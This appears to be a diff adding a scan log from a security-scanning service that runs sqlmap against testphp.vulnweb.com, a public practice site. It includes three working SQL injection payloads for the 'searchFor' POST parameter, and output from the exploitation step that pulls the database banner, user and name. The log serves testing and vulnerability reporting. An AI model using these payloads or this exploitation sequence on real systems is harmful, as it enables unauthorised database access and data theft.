@@ -2386,3 +2386,140 @@
 [2026-01-13 12:29:44] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
 [2026-01-13 12:29:44] [+] SQL scan complete. Generating PDF report...
 [2026-01-13 12:29:44] [!] PDF generation ran but file not found.
+[2026-02-03 21:50:35] [*] Starting QUICK SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-02-03 21:50:35] [*] Starting QUICK scan (Detection) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-02-03 21:50:35] [*] Executing SQLMap...
+[2026-02-03 21:50:46] [SQLMap] ___
+[2026-02-03 21:50:46] [SQLMap] __H__
+[2026-02-03 21:50:46] [SQLMap] ___ ___[)]_____ ___ ___  {1.10.1.12#dev}
+[2026-02-03 21:50:46] [SQLMap] |_ -| . [(]     | .'| . |
+[2026-02-03 21:50:46] [SQLMap] |___|_  [.]_|_|_|__,|  _|
+[2026-02-03 21:50:46] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-02-03 21:50:46] [SQLMap] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-02-03 21:50:46] [SQLMap] [*] starting @ 21:50:46 /2026-02-03/
+[2026-02-03 21:50:46] [SQLMap] [21:50:46] [WARNING] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner' as the output directory
+[2026-02-03 21:50:46] [DATA] [21:50:46] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-02-03 21:50:46] [SQLMap] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-02-03 21:50:46] [SQLMap] [21:50:46] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-02-03 21:50:46] [SQLMap] [21:50:46] [INFO] searching for links with depth 1
+[2026-02-03 21:50:46] [SQLMap] [21:50:46] [INFO] starting 2 threads
+[2026-02-03 21:50:48] [SQLMap] [21:50:48] [INFO] searching for links with depth 2
+[2026-02-03 21:50:48] [SQLMap] [21:50:48] [INFO] starting 3 threads
+[2026-02-03 21:50:49] [SQLMap] do you want to normalize crawling results [Y/n] Y
+[2026-02-03 21:50:49] [SQLMap] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-02-03 21:50:59] [SQLMap] [21:50:59] [INFO] found a total of 3 targets
+[2026-02-03 21:50:59] [SQLMap] [1/3] Form:
+[2026-02-03 21:50:59] [SQLMap] POST http://testphp.vulnweb.com/search.php?test=query
+[2026-02-03 21:50:59] [SQLMap] POST data: searchFor=&goButton=go
+[2026-02-03 21:50:59] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-02-03 21:50:59] [SQLMap] > Y
+[2026-02-03 21:50:59] [SQLMap] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
+[2026-02-03 21:50:59] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-02-03 21:50:59] [SQLMap] [21:50:59] [INFO] flushing session file
+[2026-02-03 21:50:59] [SQLMap] [21:50:59] [INFO] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-02032026_0950pm.csv' as the CSV results file in multiple targets mode
+[2026-02-03 21:50:59] [SQLMap] [21:50:59] [INFO] checking if the target is protected by some kind of WAF/IPS
+[2026-02-03 21:51:00] [SQLMap] [21:51:00] [INFO] testing if the target URL content is stable
+[2026-02-03 21:51:00] [SQLMap] [21:51:00] [INFO] target URL content is stable
+[2026-02-03 21:51:00] [SQLMap] [21:51:00] [INFO] testing if POST parameter 'searchFor' is dynamic
+[2026-02-03 21:51:01] [SQLMap] [21:51:01] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
+[2026-02-03 21:51:01] [SQLMap] [21:51:01] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
+[2026-02-03 21:51:01] [SQLMap] [21:51:01] [INFO] testing for SQL injection on POST parameter 'searchFor'
+[2026-02-03 21:51:01] [SQLMap] it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[2026-02-03 21:51:01] [SQLMap] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[2026-02-03 21:51:01] [SQLMap] [21:51:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-02-03 21:51:04] [SQLMap] [21:51:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-02-03 21:51:05] [SQLMap] [21:51:05] [WARNING] reflective value(s) found and filtering out
+[2026-02-03 21:51:05] [SQLMap] [21:51:05] [INFO] testing 'Generic inline queries'
+[2026-02-03 21:51:05] [SQLMap] [21:51:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[2026-02-03 21:51:19] [SQLMap] [21:51:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[2026-02-03 21:51:32] [SQLMap] [21:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[2026-02-03 21:51:46] [SQLMap] [21:51:46] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[2026-02-03 21:52:09] [SQLMap] [21:52:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[2026-02-03 21:52:34] [SQLMap] [21:52:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[2026-02-03 21:52:55] [SQLMap] [21:52:55] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[2026-02-03 21:53:20] [SQLMap] [21:53:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[2026-02-03 21:53:44] [SQLMap] [21:53:44] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-02-03 21:53:49] [SQLMap] [21:53:49] [INFO] POST parameter 'searchFor' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable (with --string="Our")
+[2026-02-03 21:53:49] [SQLMap] [21:53:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[2026-02-03 21:53:49] [SQLMap] [21:53:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[2026-02-03 21:53:49] [SQLMap] [21:53:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[2026-02-03 21:53:50] [SQLMap] [21:53:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[2026-02-03 21:53:50] [SQLMap] [21:53:50] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[2026-02-03 21:53:50] [SQLMap] [21:53:50] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[2026-02-03 21:53:51] [SQLMap] [21:53:51] [INFO] POST parameter 'searchFor' is 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' injectable
+[2026-02-03 21:53:51] [SQLMap] [21:53:51] [INFO] testing 'MySQL inline queries'
+[2026-02-03 21:53:51] [SQLMap] [21:53:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[2026-02-03 21:53:51] [SQLMap] [21:53:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[2026-02-03 21:53:52] [SQLMap] [21:53:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[2026-02-03 21:53:52] [SQLMap] [21:53:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[2026-02-03 21:53:52] [SQLMap] [21:53:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[2026-02-03 21:53:53] [SQLMap] [21:53:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[2026-02-03 21:53:53] [SQLMap] [21:53:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-02-03 21:54:01] [SQLMap] [21:54:01] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[2026-02-03 21:54:02] [SQLMap] [21:54:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[2026-02-03 21:54:02] [SQLMap] [21:54:02] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[2026-02-03 21:54:03] [SQLMap] [21:54:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[2026-02-03 21:54:03] [SQLMap] [21:54:03] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[2026-02-03 21:54:03] [SQLMap] [21:54:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[2026-02-03 21:54:03] [SQLMap] [21:54:03] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[2026-02-03 21:54:04] [SQLMap] [21:54:04] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[2026-02-03 21:54:04] [SQLMap] [21:54:04] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[2026-02-03 21:54:04] [SQLMap] [21:54:04] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[2026-02-03 21:54:05] [SQLMap] [21:54:05] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[2026-02-03 21:55:01] [SQLMap] [21:55:01] [INFO] POST parameter 'searchFor' appears to be 'MySQL > 5.0.12 OR time-based blind (heavy query)' injectable
+[2026-02-03 21:55:01] [SQLMap] [21:55:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[2026-02-03 21:55:01] [SQLMap] [21:55:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[2026-02-03 21:55:08] [SQLMap] [21:55:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[2026-02-03 21:55:15] [SQLMap] [21:55:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[2026-02-03 21:55:21] [SQLMap] [21:55:21] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[2026-02-03 21:55:28] [SQLMap] [21:55:28] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[2026-02-03 21:55:35] [SQLMap] [21:55:35] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[2026-02-03 21:55:41] [SQLMap] [21:55:41] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[2026-02-03 21:55:48] [SQLMap] [21:55:48] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[2026-02-03 21:55:55] [SQLMap] [21:55:55] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[2026-02-03 21:56:01] [SQLMap] [21:56:01] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[2026-02-03 21:56:08] [SQLMap] [21:56:08] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[2026-02-03 21:56:14] [DATA] POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[2026-02-03 21:56:14] [SQLMap] sqlmap identified the following injection point(s) with a total of 782 HTTP(s) requests:
+[2026-02-03 21:56:14] [SQLMap] ---
+[2026-02-03 21:56:14] [SQLMap] Parameter: searchFor (POST)
+[2026-02-03 21:56:14] [SQLMap] Type: boolean-based blind
+[2026-02-03 21:56:14] [SQLMap] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+[2026-02-03 21:56:14] [SQLMap] Payload: searchFor=xIYA' AND EXTRACTVALUE(5701,CASE WHEN (5701=5701) THEN 5701 ELSE 0x3A END) AND 'jsQn'='jsQn&goButton=go
+[2026-02-03 21:56:14] [SQLMap] Type: error-based
+[2026-02-03 21:56:14] [SQLMap] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+[2026-02-03 21:56:14] [SQLMap] Payload: searchFor=xIYA' OR GTID_SUBSET(CONCAT(0x71786a7671,(SELECT (ELT(7575=7575,1))),0x717a6b6a71),7575) AND 'zBRb'='zBRb&goButton=go
+[2026-02-03 21:56:14] [SQLMap] Type: time-based blind
+[2026-02-03 21:56:14] [SQLMap] Title: MySQL > 5.0.12 OR time-based blind (heavy query)
+[2026-02-03 21:56:14] [SQLMap] Payload: searchFor=xIYA' OR 6496=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND 'eMOS'='eMOS&goButton=go
+[2026-02-03 21:56:14] [SQLMap] ---
+[2026-02-03 21:56:14] [SQLMap] do you want to exploit this SQL injection? [Y/n] Y
+[2026-02-03 21:56:14] [SQLMap] [21:56:14] [INFO] the back-end DBMS is MySQL
+[2026-02-03 21:56:14] [SQLMap] [21:56:14] [INFO] fetching banner
+[2026-02-03 21:56:15] [SQLMap] [21:56:15] [INFO] retrieved: '8.0.22-0ubuntu0.20.04.2'
+[2026-02-03 21:56:18] [SQLMap] web server operating system: Linux Ubuntu
+[2026-02-03 21:56:18] [SQLMap] web application technology: Nginx 1.19.0, PHP 5.6.40
+[2026-02-03 21:56:18] [SQLMap] back-end DBMS operating system: Linux Ubuntu
+[2026-02-03 21:56:18] [SQLMap] back-end DBMS: MySQL >= 5.6
+[2026-02-03 21:56:18] [SQLMap] banner: '8.0.22-0ubuntu0.20.04.2'
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] fetching current user
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] retrieved: 'acuart@localhost'
+[2026-02-03 21:56:18] [SQLMap] current user: 'acuart@localhost'
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] fetching current database
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] retrieved: 'acuart'
+[2026-02-03 21:56:18] [SQLMap] current database: 'acuart'
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] testing if current user is DBA
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] fetching current user
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [WARNING] potential permission problems detected ('command denied')
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[2026-02-03 21:56:18] [SQLMap] current user is DBA: False
+[2026-02-03 21:56:18] [SQLMap] SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] skipping 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] skipping 'http://testphp.vulnweb.com/hpp/?pp=12'
+[2026-02-03 21:56:18] [SQLMap] [21:56:18] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-02032026_0950pm.csv'
+[2026-02-03 21:56:19] [+] Scan Completed. Parsing results...
+[2026-02-03 21:56:19] [INFO] Parsing log file at: D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\testphp.vulnweb.com\log
+[2026-02-03 21:56:19] [+] Parsed 3 vulnerabilities from log.
+[2026-02-03 21:56:19] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-02-03 21:56:19] [+] SQL scan complete. Generating PDF report...
+[2026-02-03 21:56:19] [!] PDF generation ran but file not found.
